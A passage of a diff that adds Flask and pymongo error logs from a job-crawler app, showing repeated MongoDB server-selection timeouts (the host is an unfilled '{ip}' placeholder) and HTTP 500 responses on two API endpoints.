+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a76, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 05:50:11] "[35m[1mGET /api/jobs/count HTTP/1.1[0m" 500 -
+[2025-02-06 05:50:11,787] ERROR in app: Exception on /api/last-crawl [GET]
+Traceback (most recent call last):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 1511, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 919, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 917, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/flask/app.py", line 902, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/intern_zip/app.py", line 95, in get_last_crawl_time
+    last_crawl = meta_collection.find_one({"type": "last_crawl"})
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/collection.py", line 1755, in find_one
+    for result in cursor.limit(-1):
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1281, in __next__
+    return self.next()
+           ^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1257, in next
+    if len(self._data) or self._refresh():
+                          ^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1205, in _refresh
+    self._send_message(q)
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/cursor.py", line 1100, in _send_message
+    response = client._run_operation(
+               ^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1752, in _run_operation
+    return self._retryable_read(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1861, in _retryable_read
+    return self._retry_internal(
+           ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/_csot.py", line 119, in csot_wrapper
+    return func(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1828, in _retry_internal
+    ).run()
+      ^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2565, in run
+    return self._read() if self._is_read else self._write()
+           ^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2700, in _read
+    self._server = self._get_server()
+                   ^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 2656, in _get_server
+    return self._client._select_server(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/mongo_client.py", line 1647, in _select_server
+    server = topology.select_server(
+             ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 402, in select_server
+    server = self._select_server(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 380, in _select_server
+    servers = self.select_servers(
+              ^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 287, in select_servers
+    server_descriptions = self._select_servers_loop(
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/intern_crawler/myenv/lib/python3.12/site-packages/pymongo/synchronous/topology.py", line 337, in _select_servers_loop
+    raise ServerSelectionTimeoutError(
+pymongo.errors.ServerSelectionTimeoutError: {ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms), Timeout: 30s, Topology Description: <TopologyDescription id: 67a356c4af26359cc72d6a77, topology_type: Unknown, servers: [<ServerDescription ('{ip}', 27017) server_type: Unknown, rtt: None, error=AutoReconnect('{ip}:27017: [Errno -2] Name or service not known (configured timeouts: socketTimeoutMS: 20000.0ms, connectTimeoutMS: 20000.0ms)')>]>
+211.196.100.34 - - [06/Feb/2025 05:50:11] "[35m[1mGET /api/last-crawl HTTP/1.1[0m" 500 -
